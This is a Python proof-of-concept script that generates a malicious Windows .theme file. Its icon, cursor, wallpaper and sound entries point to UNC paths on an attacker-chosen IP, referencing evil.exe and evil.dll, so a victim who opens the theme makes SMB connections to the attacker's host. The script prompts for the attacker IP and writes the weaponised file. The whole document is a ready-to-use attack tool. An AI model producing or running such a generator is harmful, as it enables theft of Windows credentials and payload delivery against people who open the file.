def generate_theme_with_ip(new_ip, output_path):
    raw_content = """
    ; Copyright © Microsoft Corp.
[Theme]
; Windows - IDS_THEME_DISPLAYNAME_AERO_LIGHT
DisplayName=\\192.168.226.132 Theme
SetLogonBackground=0

; Computer - SHIDI_SERVER
[CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon]
DefaultValue=\\\\192.168.226.132\\test\\evil.exe,-109

; UsersFiles - SHIDI_USERFILES
[CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\DefaultIcon]
DefaultValue=\\\\192.168.226.132\\test\\evil.exe,-123

; Network - SHIDI_MYNETWORK
[CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\DefaultIcon]
DefaultValue=\\\\192.168.226.132\\test\\evil.exe,-25

; Recycle Bin - SHIDI_RECYCLERFULL SHIDI_RECYCLER
[CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon]
Full=\\\\192.168.226.132\\test\\evil.exe,-54
Empty=\\\\192.168.226.132\\test\\evil.exe,-55

[Control Panel\\Cursors]
AppStarting=\\\\192.168.226.132\\test\\evil.exe
Arrow=\\\\192.168.226.132\\test\\aero_arrow.cur
Crosshair=
Hand=\\\\192.168.226.132\\test\\aero_link.cur
Help=\\\\192.168.226.132\\test\\aero_helpsel.cur
IBeam=
No=\\\\192.168.226.132\\test\\aero_unavail.cur
NWPen=\\\\192.168.226.132\\test\\aero_pen.cur
SizeAll=\\\\192.168.226.132\\test\\aero_move.cur
SizeNESW=\\\\192.168.226.132\\test\\aero_nesw.cur
SizeNS=\\\\192.168.226.132\\test\\aero_ns.cur
SizeNWSE=\\\\192.168.226.132\\test\\aero_nwse.cur
SizeWE=\\\\192.168.226.132\\test\\aero_ew.cur
UpArrow=\\\\192.168.226.132\\test\\aero_up.cur
Wait=\\\\192.168.226.132\\test\\aero_busy.ani
DefaultValue=Windows Default
DefaultValue.MUI=@main.cpl,-1020

[Control Panel\\Desktop]
Wallpaper=\\\\192.168.226.132\\test\\evil.exe
TileWallpaper=0
WallpaperStyle=10
Pattern=
MultimonBackgrounds=0

[VisualStyles]
Path=\\\\192.168.226.132\\Themes\\Aero\\Aero.msstyles
ColorStyle=NormalColor
Size=NormalSize
AutoColorization=0
ColorizationColor=0XC40078D4
SystemMode=Light
AppMode=Light

[boot]
SCRNSAVE.EXE=

[MasterThemeSelector]
MTSM=RJSPBS

[Sounds]
; IDS_SCHEME_DEFAULT
SchemeName=@\\\\192.168.226.132\\test\\evil.dll,-800
"""

    # Replace all occurrences of the IP address
    modified_content = raw_content.replace("192.168.226.132", new_ip)

    with open(output_path, 'w', encoding='utf-8') as file:
        file.write(modified_content)

    print(f"[+] Theme file successfully created: {output_path}")
    print(f"[+] Injected IP address: {new_ip}")

# Example usage
if __name__ == "__main__":
    output_file = "poc_modified.theme"
    new_ip = input("Write to your new IP:")  # Enter your desired IP here

    generate_theme_with_ip(new_ip, output_file)
